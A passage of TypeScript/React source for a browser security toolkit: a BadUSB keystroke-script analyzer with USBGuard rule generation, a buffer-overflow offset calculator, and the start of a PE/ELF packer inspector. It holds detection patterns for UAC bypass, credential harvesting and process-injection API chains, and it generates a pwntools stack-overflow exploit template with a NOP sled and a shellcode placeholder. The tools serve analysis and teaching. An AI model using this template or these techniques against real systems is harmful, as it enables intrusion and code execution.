          alerts.push(`Line ${idx + 1}: Credential / Wi-Fi PSK harvesting command detected.`);
        }
      } else if (cmd === "CTRL-SHIFT" && arg.toUpperCase() === "ENTER") {
        stepMs += 40;
        risk = "critical";
        note = "Launches command with Administrator UAC elevation (Ctrl+Shift+Enter)";
        alerts.push(`Line ${idx + 1}: UAC Admin Elevation keystroke sequence (CTRL-SHIFT ENTER).`);
      } else if (cmd === "ALT" && arg.toLowerCase() === "y") {
        stepMs += 40;
        risk = "critical";
        note = "Auto-accepts Windows UAC elevation prompt (Alt+Y)";
        alerts.push(`Line ${idx + 1}: Automated UAC 'Yes' confirmation bypass (ALT y).`);
      } else {
        stepMs += 25;
        note = `HID Keycode: ${cmd} ${arg}`;
      }

      totalMs += stepMs;
      decodedSteps.push({ lineNo: idx + 1, cmd, arg, ms: stepMs, risk, note });
    });

    return { decodedSteps, totalMs, totalChars, spoofedId, alerts };
  }, [scriptText]);

  const matchedUsb = useMemo(() => {
    const cleanVid = vidInput.replace(/^0x/i, "").toUpperCase();
    const cleanPid = pidInput.replace(/^0x/i, "").toUpperCase();
    const exact = USB_VID_DATABASE.find(
      (u) => u.vid === cleanVid && (u.pid === cleanPid || !cleanPid)
    );
    const vendorOnly = USB_VID_DATABASE.find((u) => u.vid === cleanVid);
    return {
      cleanVid: cleanVid.padStart(4, "0"),
      cleanPid: cleanPid.padStart(4, "0"),
      entry: exact || vendorOnly || null,
    };
  }, [vidInput, pidInput]);

  const usbGuardRules = useMemo(() => {
    const v = matchedUsb.cleanVid.toLowerCase();
    const p = matchedUsb.cleanPid.toLowerCase();
    return [
      `# /etc/usbguard/rules.conf — Generated Zero-Trust USB HID Policy`,
      `# 1. Explicitly reject this BadUSB / microcontroller VID:PID`,
      `reject id ${v}:${p}`,
      ``,
      `# 2. Block composite USB Mass Storage devices that also register a Boot Keyboard (03:01:01)`,
      `reject with-interface all-of { 08:*:* 03:01:01 }`,
      ``,
      `# 3. Require manual authorization for any new secondary HID keyboard if one is already attached`,
      `block with-interface equals { 03:01:01 } if !allowed-matches(with-interface equals { 03:01:01 })`,
    ].join("\n");
  }, [matchedUsb]);

  useEffect(() => {
    setOutput(
      [
        `=== BADUSB & DUCKYSCRIPT FORENSIC ANALYSIS ===`,
        `Spoofed USB Descriptor: ${parsedDucky.spoofedId}`,
        `Total Execution Time: ${parsedDucky.totalMs} ms (${(parsedDucky.totalMs / 1000).toFixed(2)} sec)`,
        `Injected Keystrokes: ${parsedDucky.totalChars} chars`,
        `Security Alerts (${parsedDucky.alerts.length}):`,
        ...(parsedDucky.alerts.length ? parsedDucky.alerts.map((a) => `  [!] ${a}`) : ["  None"]),
        ``,
        `--- USB VID:PID LOOKUP (${matchedUsb.cleanVid}:${matchedUsb.cleanPid}) ---`,
        matchedUsb.entry
          ? `${matchedUsb.entry.vendor} — ${matchedUsb.entry.device} [${matchedUsb.entry.risk}]`
          : `Unlisted Custom VID:PID (${matchedUsb.cleanVid}:${matchedUsb.cleanPid})`,
        ``,
        `--- LINUX USBGUARD DEFENSE POLICY ---`,
        usbGuardRules,
      ].join("\n")
    );
  }, [parsedDucky, matchedUsb, usbGuardRules, setOutput]);

  return (
    <div className="space-y-5">
      {/* Section A: DuckyScript Payload Decoder */}
      <div className="space-y-3">
        <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-3">
          <div className="flex items-center gap-2">
            <Usb className="h-4 w-4 text-accent" />
            <span className="font-heading text-xs font-bold uppercase tracking-wider text-text">
              Part A: BadUSB / Flipper Zero DuckyScript Analyzer
            </span>
          </div>
          <div className="flex flex-wrap gap-1.5">
            {(["revshell", "wifi", "benign"] as const).map((k) => (
              <button
                key={k}
                type="button"
                onClick={() => {
                  setPreset(k);
                  setScriptText(DUCKYSCRIPT_PRESETS[k].script);
                }}
                className={`rounded-xs border px-2.5 py-1 font-heading text-[11px] font-bold uppercase tracking-wider transition cursor-pointer ${
                  preset === k
                    ? "border-[#ff6a00] bg-[#ff6a00] text-white"
                    : "border-border bg-background text-text-muted hover:border-accent hover:text-text"
                }`}
              >
                {DUCKYSCRIPT_PRESETS[k].label}
              </button>
            ))}
          </div>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-12 gap-4">
          <div className="lg:col-span-6 space-y-2">
            <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted">
              DuckyScript Source Payload
            </label>
            <textarea
              rows={8}
              value={scriptText}
              onChange={(e) => setScriptText(e.target.value)}
              className="w-full rounded-xs border border-border bg-background p-3 font-mono-code text-xs text-text focus:border-accent focus:outline-none"
            />
            <div className="grid grid-cols-3 gap-2 text-center">
              <div className="rounded-xs border border-border bg-background p-2">
                <div className="text-[10px] font-heading uppercase text-text-muted">Runtime</div>
                <div className="font-mono-code text-sm font-bold text-accent">
                  {(parsedDucky.totalMs / 1000).toFixed(2)}s ({parsedDucky.totalMs}ms)
                </div>
              </div>
              <div className="rounded-xs border border-border bg-background p-2">
                <div className="text-[10px] font-heading uppercase text-text-muted">Typed Chars</div>
                <div className="font-mono-code text-sm font-bold text-text">
                  {parsedDucky.totalChars} chars
                </div>
              </div>
              <div className="rounded-xs border border-border bg-background p-2">
                <div className="text-[10px] font-heading uppercase text-text-muted">Threat Flags</div>
                <div
                  className={`font-mono-code text-sm font-bold ${
                    parsedDucky.alerts.length > 0 ? "text-red-400" : "text-emerald-400"
                  }`}
                >
                  {parsedDucky.alerts.length} Alerts
                </div>
              </div>
            </div>
          </div>

          {/* Step-by-Step Execution Timeline */}
          <div className="lg:col-span-6 space-y-2">
            <span className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted">
              Decoded HID Keystroke Timeline
            </span>
            <div className="max-h-56 overflow-y-auto rounded-xs border border-border bg-background divide-y divide-border">
              {parsedDucky.decodedSteps.map((s) => (
                <div key={s.lineNo} className="p-2.5 text-xs flex items-start justify-between gap-2">
                  <div className="space-y-0.5">
                    <div className="flex items-center gap-2">
                      <span className="font-mono-code text-[10px] text-text-muted">L{s.lineNo}</span>
                      <span
                        className={`rounded-xs px-1.5 py-0.5 font-mono-code text-[10px] font-bold ${
                          s.risk === "critical"
                            ? "bg-red-500/20 text-red-300"
                            : s.risk === "warn"
                            ? "bg-amber-500/20 text-amber-300"
                            : "bg-surface text-accent"
                        }`}
                      >
                        {s.cmd}
                      </span>
                      <span className="font-mono-code text-[11px] text-text truncate max-w-[220px]">
                        {s.arg}
                      </span>
                    </div>
                    <p className="text-[11px] text-text-muted">{s.note}</p>
                  </div>
                  <span className="shrink-0 font-mono-code text-[10px] text-text-muted">
                    +{s.ms}ms
                  </span>
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>

      {/* Section B: USB VID:PID Lookup & USBGuard */}
      <div className="rounded-xs border border-border bg-background p-4 space-y-3">
        <div className="flex flex-wrap items-center justify-between gap-2">
          <span className="font-heading text-xs font-bold uppercase tracking-wider text-accent">
            Part B: USB VID:PID Hardware Identifier Lookup & USBGuard Rule Generator
          </span>
          <div className="flex flex-wrap gap-1.5">
            {USB_VID_DATABASE.map((u) => (
              <button
                key={`${u.vid}:${u.pid}`}
                type="button"
                onClick={() => {
                  setVidInput(u.vid);
                  setPidInput(u.pid);
                }}
                className={`rounded-xs border px-2 py-0.5 font-mono-code text-[10px] font-bold transition cursor-pointer ${
                  matchedUsb.cleanVid === u.vid
                    ? "border-accent bg-accent/15 text-accent"
                    : "border-border bg-surface text-text-muted hover:text-text"
                }`}
              >
                0x{u.vid} ({u.vendor.split(/[ ,]/)[0]})
              </button>
            ))}
          </div>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
          <div>
            <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
              Vendor ID (VID Hex)
            </label>
            <input
              type="text"
              maxLength={6}
              value={vidInput}
              onChange={(e) => setVidInput(e.target.value)}
              className="w-full rounded-xs border border-border bg-surface px-2.5 py-1.5 font-mono-code text-xs text-text"
            />
          </div>
          <div>
            <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
              Product ID (PID Hex)
            </label>
            <input
              type="text"
              maxLength={6}
              value={pidInput}
              onChange={(e) => setPidInput(e.target.value)}
              className="w-full rounded-xs border border-border bg-surface px-2.5 py-1.5 font-mono-code text-xs text-text"
            />
          </div>
          <div>
            <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
              USB Interface Class
            </label>
            <select
              value={usbClass}
              onChange={(e) => setUsbClass(e.target.value as "03:01:01" | "08:06:50" | "03+02")}
              className="w-full rounded-xs border border-border bg-surface px-2.5 py-1.5 font-mono-code text-xs text-text"
            >
              <option value="03:01:01">03:01:01 (HID Boot Keyboard)</option>
              <option value="08:06:50">08:06:50 (USB Mass Storage)</option>
              <option value="03+02">03:01:01 + 02:02:01 (Composite HID + CDC Serial)</option>
            </select>
          </div>
        </div>

        {matchedUsb.entry ? (
          <div className="rounded-xs border border-border bg-surface p-3 flex flex-wrap items-center justify-between gap-2">
            <div>
              <div className="font-heading text-xs font-bold text-text">
                {matchedUsb.entry.vendor} — {matchedUsb.entry.device}
              </div>
              <p className="text-[11px] text-text-muted mt-0.5">{matchedUsb.entry.notes}</p>
            </div>
            <span
              className={`rounded-xs px-2 py-0.5 font-mono-code text-[10px] font-bold ${
                matchedUsb.entry.risk === "HIGH-RISK BADUSB"
                  ? "bg-red-500/20 text-red-300 border border-red-500/40"
                  : matchedUsb.entry.risk === "DUAL-USE"
                  ? "bg-amber-500/20 text-amber-300 border border-amber-500/40"
                  : "bg-emerald-500/20 text-emerald-300 border border-emerald-500/40"
              }`}
            >
              {matchedUsb.entry.risk}
            </span>
          </div>
        ) : null}

        <div className="space-y-1.5">
          <div className="flex items-center justify-between">
            <span className="font-heading text-[11px] font-bold uppercase text-text-muted">
              Generated Linux USBGuard Rules (/etc/usbguard/rules.conf)
            </span>
            <InlineCopyButton text={usbGuardRules} label="Copy USBGuard Policy" />
          </div>
          <pre className="overflow-x-auto rounded-xs bg-surface p-3 font-mono-code text-xs text-text">
            {usbGuardRules}
          </pre>
        </div>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 3. BUFFER OVERFLOW CYCLIC PATTERN & EIP/RIP OFFSET CALCULATOR
 * ========================================================================== */
function generateCyclicPattern(length: number): string {
  const upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
  const lower = "abcdefghijklmnopqrstuvwxyz";
  const digits = "0123456789";
  let out = "";
  for (let u = 0; u < upper.length; u++) {
    for (let l = 0; l < lower.length; l++) {
      for (let d = 0; d < digits.length; d++) {
        out += upper[u] + lower[l] + digits[d];
        if (out.length >= length) {
          return out.slice(0, length);
        }
      }
    }
  }
  return out.slice(0, length);
}

function BufferOverflowCyclicPatternGenerator({ tool }: { tool: Tool }) {
  const { setOutput, resetTrigger } = useToolCard();
  const [patternLen, setPatternLen] = useState<number>(512);
  const [crashInput, setCrashInput] = useState<string>("0x37614136");
  const [retAddrInput, setRetAddrInput] = useState<string>("0x080491a2");
  const [arch, setArch] = useState<"x86" | "x64">("x86");
  const [nopCount, setNopCount] = useState<number>(16);
  const [badCharsInput, setBadCharsInput] = useState<string>("\\x00\\x0a\\x0d\\x20");

  useEffect(() => {
    if (resetTrigger > 0) {
      setPatternLen(512);
      setCrashInput("0x37614136");
      setRetAddrInput("0x080491a2");
      setArch("x86");
      setNopCount(16);
    }
  }, [resetTrigger]);

  const pattern = useMemo(
    () => generateCyclicPattern(Math.min(8192, Math.max(64, patternLen))),
    [patternLen]
  );

  const offsetResult = useMemo(() => {
    const clean = crashInput.trim();
    if (!clean) return null;

    let asciiLE = "";
    let asciiBE = "";

    const hexMatch = clean.replace(/^0x/i, "");
    if (/^[0-9a-fA-F]{8}$/.test(hexMatch) || /^[0-9a-fA-F]{16}$/.test(hexMatch)) {
      const bytes: number[] = [];
      for (let i = 0; i < hexMatch.length; i += 2) {
        bytes.push(parseInt(hexMatch.slice(i, i + 2), 16));
      }
      asciiBE = bytes.map((b) => String.fromCharCode(b)).join("");
      asciiLE = [...bytes].reverse().map((b) => String.fromCharCode(b)).join("");
    } else {
      asciiLE = clean;
      asciiBE = clean.split("").reverse().join("");
    }

    const idxLE = pattern.indexOf(asciiLE);
    const idxBE = pattern.indexOf(asciiBE);

    return {
      asciiLE,
      asciiBE,
      idxLE,
      idxBE,
      matchedOffset: idxLE !== -1 ? idxLE : idxBE,
      endianness:
        idxLE !== -1
          ? "Little-Endian (x86 / x86_64 / ARM)"
          : idxBE !== -1
          ? "Big-Endian (MIPS / Network)"
          : "Not Found in Current Pattern Length",
    };
  }, [crashInput, pattern]);

  const packedAddress = useMemo(() => {
    const cleanHex = retAddrInput.trim().replace(/^0x/i, "");
    const width = arch === "x86" ? 8 : 16;
    const padded = cleanHex.padStart(width, "0").slice(-width);
    const bytes: number[] = [];
    for (let i = 0; i < padded.length; i += 2) {
      bytes.push(parseInt(padded.slice(i, i + 2), 16) || 0);
    }
    const leBytes = [...bytes].reverse();
    const leEscaped = leBytes.map((b) => `\\x${b.toString(16).padStart(2, "0")}`).join("");
    const beEscaped = bytes.map((b) => `\\x${b.toString(16).padStart(2, "0")}`).join("");

    // Check badchars
    const badMatches: string[] = [];
    const badHexes = badCharsInput
      .split(/\\x|\s+/)
      .map((s) => s.trim().toLowerCase())
      .filter((s) => /^[0-9a-f]{2}$/.test(s));
    leBytes.forEach((b) => {
      const h = b.toString(16).padStart(2, "0");
      if (badHexes.includes(h)) badMatches.push(`\\x${h}`);
    });

    const exactOffset =
      offsetResult && offsetResult.matchedOffset !== -1 ? offsetResult.matchedOffset : 112;
    const pwnFunc = arch === "x86" ? "p32" : "p64";
    const pyScript = [
      `#!/usr/bin/env python3`,
      `from pwn import *`,
      ``,
      `offset = ${exactOffset}  # Exact cyclic offset to saved ${arch === "x86" ? "EIP" : "RIP"}`,
      `ret_addr = 0x${padded}  # Little-Endian: b"${leEscaped}"`,
      `nop_sled = b"\\x90" * ${nopCount}`,
      `shellcode = b"\\xcc" * 32  # Replace with msfvenom -b '${badCharsInput}' payload`,
      ``,
      `payload = flat({`,
      `    offset: [`,
      `        ${pwnFunc}(ret_addr),`,
      `        nop_sled,`,
      `        shellcode`,
      `    ]`,
      `})`,
      `sys.stdout.buffer.write(payload)`,
    ].join("\n");

    return { padded, leEscaped, beEscaped, badMatches, pyScript, exactOffset };
  }, [retAddrInput, arch, nopCount, badCharsInput, offsetResult]);

  useEffect(() => {
    setOutput(
      [
        `=== DE BRUIJN CYCLIC PATTERN & EIP/RIP OFFSET REPORT ===`,
        `Pattern Length: ${pattern.length} bytes`,
        `Query Value: ${crashInput}`,
        `Decoded Little-Endian ASCII: "${offsetResult?.asciiLE ?? ""}" -> Offset: ${
          offsetResult?.idxLE !== -1 ? offsetResult?.idxLE : "Not found"
        }`,
        `Decoded Big-Endian ASCII: "${offsetResult?.asciiBE ?? ""}" -> Offset: ${
          offsetResult?.idxBE !== -1 ? offsetResult?.idxBE : "Not found"
        }`,
        `Target Return Address (0x${packedAddress.padded}):`,
        `  Little-Endian: b"${packedAddress.leEscaped}"`,
        `  Big-Endian:    b"${packedAddress.beEscaped}"`,
        `  Badchar Collisions: ${packedAddress.badMatches.join(", ") || "None (Clean)"}`,
        ``,
        `--- GENERATED PWNTOOLS EXPLOIT TEMPLATE ---`,
        packedAddress.pyScript,
        ``,
        `--- RAW CYCLIC PATTERN (${pattern.length} BYTES) ---`,
        pattern,
      ].join("\n")
    );
  }, [pattern, crashInput, offsetResult, packedAddress, setOutput]);

  return (
    <div className="space-y-5">
      {/* Pattern Length Controls */}
      <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-3">
        <div className="flex items-center gap-2">
          <Bug className="h-4 w-4 text-accent" />
          <span className="font-heading text-xs font-bold uppercase tracking-wider text-text">
            Metasploit-Compatible De Bruijn Cyclic Pattern Generator
          </span>
        </div>
        <div className="flex flex-wrap gap-1.5">
          {[128, 256, 512, 1024, 2048, 4096].map((len) => (
            <button
              key={len}
              type="button"
              onClick={() => setPatternLen(len)}
              className={`rounded-xs border px-2.5 py-1 font-mono-code text-xs font-bold transition cursor-pointer ${
                patternLen === len
                  ? "border-[#ff6a00] bg-[#ff6a00] text-white"
                  : "border-border bg-background text-text-muted hover:border-accent hover:text-text"
              }`}
            >
              {len} B
            </button>
          ))}
        </div>
      </div>

      {/* Cyclic Pattern Output Box with Highlighted Match */}
      <div className="space-y-1.5">
        <div className="flex items-center justify-between">
          <span className="font-heading text-xs font-bold uppercase tracking-wider text-text-muted">
            Generated Non-Repeating Pattern ({pattern.length} bytes)
          </span>
          <InlineCopyButton text={pattern} label="Copy Pattern" />
        </div>
        <div className="max-h-36 overflow-y-auto rounded-xs border border-border bg-background p-3 font-mono-code text-xs text-text break-all leading-relaxed">
          {offsetResult && offsetResult.matchedOffset !== -1 ? (
            <>
              <span>{pattern.slice(0, offsetResult.matchedOffset)}</span>
              <mark className="rounded-xs bg-[#ff6a00] px-1 py-0.5 font-bold text-white">
                {pattern.slice(
                  offsetResult.matchedOffset,
                  offsetResult.matchedOffset + (offsetResult.asciiLE.length || 4)
                )}
              </mark>
              <span>
                {pattern.slice(offsetResult.matchedOffset + (offsetResult.asciiLE.length || 4))}
              </span>
            </>
          ) : (
            pattern
          )}
        </div>
      </div>

      {/* EIP / RIP Offset Locator + Return Address Packer */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
        <div className="rounded-xs border border-border bg-background p-4 space-y-3">
          <div className="flex items-center justify-between">
            <span className="font-heading text-xs font-bold uppercase tracking-wider text-accent">
              1. EIP / RIP Crash Offset Finder
            </span>
            <div className="flex gap-1">
              {["0x37614136", "0x41326241", "Aa8A"].map((sample) => (
                <button
                  key={sample}
                  type="button"
                  onClick={() => setCrashInput(sample)}
                  className="rounded-xs border border-border bg-surface px-1.5 py-0.5 font-mono-code text-[10px] text-text-muted hover:text-text cursor-pointer"
                >
                  {sample}
                </button>
              ))}
            </div>
          </div>

          <div>
            <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
              Crash Register Value (4/8-byte Hex or 4-char ASCII)
            </label>
            <input
              type="text"
              value={crashInput}
              onChange={(e) => setCrashInput(e.target.value)}
              placeholder="e.g. 0x37614136 or 6Aa7"
              className="w-full rounded-xs border border-border bg-surface px-3 py-1.5 font-mono-code text-xs text-text focus:border-accent focus:outline-none"
            />
          </div>

          {offsetResult && (
            <div className="rounded-xs border border-border bg-surface p-3 space-y-1.5">
              <div className="flex items-center justify-between">
                <span className="text-xs text-text-muted">Exact Crash Offset:</span>
                <span
                  className={`font-mono-code text-sm font-bold ${
                    offsetResult.matchedOffset !== -1 ? "text-emerald-400" : "text-red-400"
                  }`}
                >
                  {offsetResult.matchedOffset !== -1
                    ? `${offsetResult.matchedOffset} bytes`
                    : "Not Found"}
                </span>
              </div>
              <div className="flex items-center justify-between text-xs">
                <span className="text-text-muted">Little-Endian ASCII:</span>
                <span className="font-mono-code text-text">
                  &quot;{offsetResult.asciiLE}&quot; (offset {offsetResult.idxLE})
                </span>
              </div>
              <div className="flex items-center justify-between text-xs">
                <span className="text-text-muted">Big-Endian ASCII:</span>
                <span className="font-mono-code text-text">
                  &quot;{offsetResult.asciiBE}&quot; (offset {offsetResult.idxBE})
                </span>
              </div>
            </div>
          )}
        </div>

        {/* Return Address Packer */}
        <div className="rounded-xs border border-border bg-background p-4 space-y-3">
          <div className="flex items-center justify-between">
            <span className="font-heading text-xs font-bold uppercase tracking-wider text-accent">
              2. Return Address Endianness Packer
            </span>
            <div className="flex gap-1">
              {(["x86", "x64"] as const).map((a) => (
                <button
                  key={a}
                  type="button"
                  onClick={() => setArch(a)}
                  className={`rounded-xs px-2 py-0.5 font-mono-code text-[10px] font-bold uppercase cursor-pointer ${
                    arch === a ? "bg-[#ff6a00] text-white" : "bg-surface text-text-muted"
                  }`}
                >
                  {a}
                </button>
              ))}
            </div>
          </div>

          <div className="grid grid-cols-2 gap-2.5">
            <div>
              <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
                Target Return / Gadget Hex
              </label>
              <input
                type="text"
                value={retAddrInput}
                onChange={(e) => setRetAddrInput(e.target.value)}
                className="w-full rounded-xs border border-border bg-surface px-2.5 py-1.5 font-mono-code text-xs text-text"
              />
            </div>
            <div>
              <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
                Badchars Filter
              </label>
              <input
                type="text"
                value={badCharsInput}
                onChange={(e) => setBadCharsInput(e.target.value)}
                className="w-full rounded-xs border border-border bg-surface px-2.5 py-1.5 font-mono-code text-xs text-text"
              />
            </div>
          </div>

          <div className="rounded-xs border border-border bg-surface p-3 space-y-1.5 text-xs">
            <div className="flex items-center justify-between">
              <span className="text-text-muted">Little-Endian Bytes:</span>
              <code className="font-mono-code font-bold text-accent">
                b&quot;{packedAddress.leEscaped}&quot;
              </code>
            </div>
            <div className="flex items-center justify-between">
              <span className="text-text-muted">Big-Endian Bytes:</span>
              <code className="font-mono-code text-text">
                b&quot;{packedAddress.beEscaped}&quot;
              </code>
            </div>
            <div className="flex items-center justify-between">
              <span className="text-text-muted">Badchar Collision Check:</span>
              <span
                className={`font-mono-code font-bold ${
                  packedAddress.badMatches.length > 0 ? "text-red-400" : "text-emerald-400"
                }`}
              >
                {packedAddress.badMatches.length > 0
                  ? `ALERT: Contains ${packedAddress.badMatches.join(", ")}`
                  : "PASS (No Badchars)"}
              </span>
            </div>
          </div>
        </div>
      </div>

      {/* Pwntools Script */}
      <div className="rounded-xs border border-border bg-background p-3.5 space-y-2">
        <div className="flex items-center justify-between">
          <span className="font-heading text-xs font-bold uppercase tracking-wider text-text">
            Generated Python 3 / Pwntools Exploit Payload Script
          </span>
          <InlineCopyButton text={packedAddress.pyScript} label="Copy Exploit Script" />
        </div>
        <pre className="overflow-x-auto rounded-xs bg-surface p-3 font-mono-code text-xs text-text">
          {packedAddress.pyScript}
        </pre>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 4. PE / ELF BINARY PACKER, UPX & ENTROPY INSPECTOR
 * ========================================================================== */
interface BinarySectionRow {
  name: string;
  virtualSize: number;
  rawSize: number;
  perms: "R-X" | "R--" | "RW-" | "RWX";
  entropy: number;
}

const BINARY_PRESETS: Record<
  "upx" | "vmprotect" | "hollowing" | "clean",
  { label: string; sections: BinarySectionRow[]; imports: string[] }
> = {
  upx: {
    label: "UPX 4.2 Packed Executable",
    sections: [
      { name: "UPX0", virtualSize: 294912, rawSize: 0, perms: "RWX", entropy: 0.0 },
      { name: "UPX1", virtualSize: 118784, rawSize: 114688, perms: "RWX", entropy: 7.91 },
      { name: ".rsrc", virtualSize: 8192, rawSize: 4096, perms: "RW-", entropy: 4.12 },
    ],
    imports: ["LoadLibraryA", "GetProcAddress", "VirtualProtect", "ExitProcess"],
  },
  vmprotect: {
    label: "VMProtect / Themida Virtualized Malware",
    sections: [
      { name: ".text", virtualSize: 16384, rawSize: 0, perms: "R-X", entropy: 0.0 },
      { name: ".vmp0", virtualSize: 524288, rawSize: 518144, perms: "RWX", entropy: 7.96 },
      { name: ".vmp1", virtualSize: 131072, rawSize: 129024, perms: "R-X", entropy: 7.84 },
    ],
    imports: ["LoadLibraryA", "GetProcAddress", "IsDebuggerPresent", "NtQueryInformationProcess"],
  },
  hollowing: {
    label: "Process Hollowing Trojan (RunPE)",
    sections: [
      { name: ".text", virtualSize: 65536, rawSize: 65536, perms: "R-X", entropy: 6.18 },
      { name: ".rdata", virtualSize: 24576, rawSize: 24576, perms: "R--", entropy: 5.04 },
      { name: ".data", virtualSize: 98304, rawSize: 98304, perms: "RW-", entropy: 7.68 },
    ],
    imports: [
      "CreateProcessInternalW",
      "NtUnmapViewOfSection",
      "VirtualAllocEx",
      "WriteProcessMemory",
      "SetThreadContext",
      "ResumeThread",
      "IsDebuggerPresent",
    ],
  },
  clean: {
    label: "Standard Unpacked C++ Binary",
    sections: [
      { name: ".text", virtualSize: 147456, rawSize: 147456, perms: "R-X", entropy: 6.12 },
      { name: ".rdata", virtualSize: 49152, rawSize: 49152, perms: "R--", entropy: 4.88 },
      { name: ".data", virtualSize: 12288, rawSize: 8192, perms: "RW-", entropy: 2.95 },
      { name: ".rsrc", virtualSize: 16384, rawSize: 16384, perms: "R--", entropy: 3.74 },
    ],
    imports: ["GetModuleHandleW", "HeapAlloc", "WriteFile", "CloseHandle"],
  },
};

const SUSPICIOUS_WIN_APIS = [
  "VirtualAllocEx",
  "WriteProcessMemory",
  "CreateRemoteThread",
  "NtUnmapViewOfSection",
  "CreateProcessInternalW",
  "SetThreadContext",
  "ResumeThread",
  "LoadLibraryA",
  "GetProcAddress",
  "VirtualProtect",
  "IsDebuggerPresent",
  "NtQueryInformationProcess",
];

function PeElfPackerUpxEntropyInspector({ tool }: { tool: Tool }) {
  const { setOutput, resetTrigger } = useToolCard();
  const [preset, setPreset] = useState<"upx" | "vmprotect" | "hollowing" | "clean">("upx");
  const [sections, setSections] = useState<BinarySectionRow[]>(BINARY_PRESETS.upx.sections);
  const [activeImports, setActiveImports] = useState<string[]>(BINARY_PRESETS.upx.imports);
  const [customBytesText, setCustomBytesText] = useState<string>(
    "4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00 B8 00 00 00 55 50 58 30 00 00 00 00"
  );

  const selectPreset = useCallback((k: "upx" | "vmprotect" | "hollowing" | "clean") => {
    setPreset(k);
    setSections(BINARY_PRESETS[k].sections);
    setActiveImports(BINARY_PRESETS[k].imports);
  }, []);

  useEffect(() => {
    if (resetTrigger > 0) {
      selectPreset("upx");
    }
  }, [resetTrigger, selectPreset]);

  const toggleImport = (api: string) => {
    setActiveImports((prev) =>
      prev.includes(api) ? prev.filter((x) => x !== api) : [...prev, api]
    );
  };

  const liveSampleEntropy = useMemo(() => {
    if (!customBytesText.trim()) return 0;
    const freq: Record<number, number> = {};
    let count = 0;
    for (let i = 0; i < customBytesText.length; i++) {
      const code = customBytesText.charCodeAt(i) & 0xff;
      freq[code] = (freq[code] || 0) + 1;
      count++;
    }
    let h = 0;
    for (const k of Object.keys(freq)) {
      const p = freq[Number(k)] / count;
      h -= p * Math.log2(p);
    }
    return h;
  }, [customBytesText]);

  const findings = useMemo(() => {
    const flags: string[] = [];
    let packerVerdict = "Unpacked Native Binary";

    sections.forEach((s) => {
      if (/^UPX/i.test(s.name)) {
        packerVerdict = "UPX Packer Detected (Stub + Compressed Section)";
        flags.push(`Section "${s.name}" matches UPX signature.`);
      }
      if (/^\.vmp|themida|enigma/i.test(s.name)) {
        packerVerdict = "Commercial Virtualizer / Protector (VMProtect / Themida)";
        flags.push(`Section "${s.name}" indicates commercial bytecode virtualization.`);
      }
      if (s.rawSize === 0 && s.virtualSize > 32768) {
        flags.push(
          `Section "${s.name}" has RawSize=0 bytes but VirtualSize=${s.virtualSize.toLocaleString()} bytes (Unpacking stub hollow section).`
        );
      }
      if (s.perms === "RWX") {
        flags.push(
          `Section "${s.name}" has simultaneous Write + Execute (RWX) memory permissions (Self-modifying code / unpacker).`
        );
      }
      if (s.entropy >= 7.2) {
        flags.push(
          `Section "${s.name}" has high Shannon Entropy (${s.entropy.toFixed(2)} / 8.00 bits/byte) -> Encrypted or compressed payload.`
        );
      }
    });

    const hasApi = (name: string) => activeImports.includes(name);
    if (hasApi("NtUnmapViewOfSection") && hasApi("VirtualAllocEx") && hasApi("WriteProcessMemory")) {
      flags.push(
        "CRITICAL IAT CHAIN: Process Hollowing (RunPE) sequence detected (NtUnmapViewOfSection + VirtualAllocEx + WriteProcessMemory + SetThreadContext)."
      );
    } else if (hasApi("VirtualAllocEx") && hasApi("WriteProcessMemory") && hasApi("CreateRemoteThread")) {
      flags.push(
        "CRITICAL IAT CHAIN: Classic Remote Thread DLL/Shellcode Injection detected."
      );
    }
    if (hasApi("LoadLibraryA") && hasApi("GetProcAddress") && activeImports.length <= 5) {
      flags.push(
        "TINY IAT STUB: Only LoadLibraryA + GetProcAddress imported -> Dynamic API resolution / Packed IAT."
      );
    }
    if (hasApi("IsDebuggerPresent") || hasApi("NtQueryInformationProcess")) {
      flags.push("ANTI-DEBUGGING: Imports debugger detection APIs to evade analyst sandboxes.");
    }

    return { packerVerdict, flags };
  }, [sections, activeImports]);

  useEffect(() => {
    setOutput(
      [
        `=== PE / ELF BINARY PACKER & SHANNON ENTROPY REPORT ===`,
        `Packer Verdict: ${findings.packerVerdict}`,
        `Active IAT Imports (${activeImports.length}): ${activeImports.join(", ")}`,
        ``,
        `--- SECTION TABLE ---`,
        ...sections.map(
          (s) =>
            `${s.name.padEnd(8)} | Virt: ${String(s.virtualSize).padStart(7)} B | Raw: ${String(
              s.rawSize
            ).padStart(7)} B | Perms: ${s.perms} | Entropy: ${s.entropy.toFixed(2)} / 8.00`
        ),
        ``,
        `--- FORENSIC INDICATORS ---`,
        ...(findings.flags.length ? findings.flags.map((f) => `[!] ${f}`) : ["Clean section table."]),
      ].join("\n")
    );
  }, [sections, activeImports, findings, setOutput]);

  return (
    <div className="space-y-5">
      <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-3">
        <div className="flex items-center gap-2">
          <Layers className="h-4 w-4 text-accent" />
          <span className="font-heading text-xs font-bold uppercase tracking-wider text-text">
            PE / ELF Section Table & Packer Presets
          </span>
        </div>
        <div className="flex flex-wrap gap-1.5">
          {(["upx", "vmprotect", "hollowing", "clean"] as const).map((k) => (
            <button
              key={k}
              type="button"
              onClick={() => selectPreset(k)}
              className={`rounded-xs border px-2.5 py-1 font-heading text-[11px] font-bold uppercase tracking-wider transition cursor-pointer ${
                preset === k
                  ? "border-[#ff6a00] bg-[#ff6a00] text-white"
